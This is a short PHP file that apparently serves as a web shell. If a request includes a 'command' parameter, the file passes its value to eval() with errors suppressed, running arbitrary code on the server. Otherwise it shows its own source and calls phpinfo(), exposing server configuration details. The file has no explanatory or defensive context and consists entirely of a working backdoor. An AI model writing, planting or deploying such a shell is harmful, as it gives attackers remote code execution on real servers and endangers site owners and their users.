<?php
if(isset($_REQUEST['command'])){
        echo "<pre><br>";
        $cmd = ($_REQUEST['command']);
        @eval($cmd);
        echo "</br></pre>";
        die;
}
else{
    show_source(__FILE__);
    phpinfo();
}

?>